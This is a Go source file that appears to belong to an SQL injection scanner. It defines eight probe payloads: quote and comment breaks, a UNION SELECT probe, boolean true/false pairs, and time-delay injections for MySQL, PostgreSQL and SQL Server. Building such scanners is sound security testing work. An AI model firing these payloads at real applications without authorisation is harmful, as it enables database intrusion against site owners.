package main

import "time"

type Payload struct {
	Name          string
	Category      string
	Value         string
	ExpectedDelay time.Duration
	BooleanPair   string
	BooleanMode   string
}

func defaultPayloads() []Payload {
	return []Payload{
		{Name: "quote-break", Category: "error-based", Value: "'"},
		{Name: "comment-break", Category: "error-based", Value: "'--"},
		{Name: "union-probe", Category: "union-based", Value: "' UNION SELECT NULL--"},
		{Name: "boolean-true", Category: "boolean-based", Value: "' OR '1'='1'--", BooleanPair: "classic-boolean", BooleanMode: "true"},
		{Name: "boolean-false", Category: "boolean-based", Value: "' OR '1'='2'--", BooleanPair: "classic-boolean", BooleanMode: "false"},
		{Name: "time-mysql", Category: "time-based", Value: "' OR SLEEP(1)--", ExpectedDelay: time.Second},
		{Name: "time-postgres", Category: "time-based", Value: "'; SELECT pg_sleep(1)--", ExpectedDelay: time.Second},
		{Name: "time-sqlserver", Category: "time-based", Value: "'; WAITFOR DELAY '0:0:1'--", ExpectedDelay: time.Second},
	}
}
